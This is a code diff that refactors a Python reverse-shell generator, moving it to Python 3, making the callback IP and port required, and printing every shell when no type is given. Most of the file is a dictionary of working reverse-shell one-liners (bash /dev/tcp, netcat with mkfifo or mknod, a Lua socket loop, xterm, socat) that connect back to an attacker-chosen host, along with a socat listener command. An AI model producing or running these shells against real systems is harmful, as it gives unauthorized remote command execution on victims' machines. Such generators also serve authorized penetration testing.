@@ -4,22 +4,17 @@ import argparse
 
 def parse_options():
     
-    global ipaddr, port, type, list
     parser = argparse.ArgumentParser(description='python revshellgen.py -i 127.0.0.1 -p 4444 -t bash')
-    parser.add_argument("-i", "--ipaddr", type=str, help="IP address to connect back to")
-    parser.add_argument("-p", "--port", type=int, help="Port to connect back to")
-    parser.add_argument("-t", "--type", type=str, help="Type of reverse shell to generate")
-    parser.add_argument("-l", "--list", action="store_true", help="List available shell types")
+    parser.add_argument("-i", "--ipaddr", type=str, help="IP address to connect back to", required=True)
+    parser.add_argument("-p", "--port", type=int, help="Port to connect back to", required=True)
+    parser.add_argument("-t", "--type", type=str, help="Type of reverse shell to generate", dest='shelltype')
+    parser.add_argument("-l", "--list", action="store_true", help="List available shell types", dest='shelllist')
     args = parser.parse_args()
+    return args
+
+def main(args):
     ipaddr = args.ipaddr
     port = args.port
-    type = args.type
-    list = args.list
-    if not ipaddr or port in args:
-        ipaddr = 0
-        port = 0
-
-def main(ipaddr, port, type):
 
     shells = {
         'bash':'bash -i >& /dev/tcp/%s/%d 0>&1' % (ipaddr, port),
@@ -31,19 +26,22 @@ def main(ipaddr, port, type):
         'nc1':'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %d >/tmp/f' % (ipaddr, port),
         'nc2':'rm /tmp/l;mknod /tmp/l p;/bin/sh 0</tmp/l | nc %s %d 1>/tmp/l' % (ipaddr, port),
         'lua':'lua5.1 -e \'local host,port = \"%s\",%d local socket = require(\"socket\") local tcp = socket.tcp() local io = require(\"io\") tcp:connect(host,port); while true do local cmd,status,partial = tcp:receive() local f = io.popen(cmd,'r') local s = f:read(\"*a\") f:close() tcp:send(s) if status == \"closed\" then break end end tcp:close()' % (ipaddr, port),
-        'xterm':'xterm -display %s:1 \n\nConnect to your shell with:\n\nXnest :1 or xhost +targetip' % (ipaddr),
-        'socat':'socat exec:\'bash -li\',pty,stderr,setid,sigint,sane tcp:%s:%d \n\nCatch incoming shell with:\n\nsocat file:`tty`,raw,echo=0 tcp-listen:%d' % (ipaddr, port, port)
+        'xterm':'xterm -display %s:1 \n# Connect to your shell with:\n# Xnest :1 or xhost +targetip' % (ipaddr),
+        'socat':'socat exec:\'bash -li\',pty,stderr,setid,sigint,sane tcp:%s:%d \n# Catch incoming shell with:\n# socat file:`tty`,raw,echo=0 tcp-listen:%d' % (ipaddr, port, port)
     }
 
-    if list:
-        print "\nAvailable shell types:"
-        print shells.keys()
+    if args.shelllist:
+        print("\nAvailable shell types:")
+        print(shells.keys())
 
-    if type in shells:
-        print "\nReverse shell command:\n"
-        print shells[type]
+    print("Reverse shell command:\n")
+    if args.shelltype and args.shelltype in shells:
+        print(shells[args.shelltype])
+    else:
+        for t,shell in shells.items():
+            print("{}\n".format(shell))
         
 if __name__ == "__main__":
 
-    parse_options()
-    main(ipaddr, port, type)
+    args = parse_options()
+    main(args)
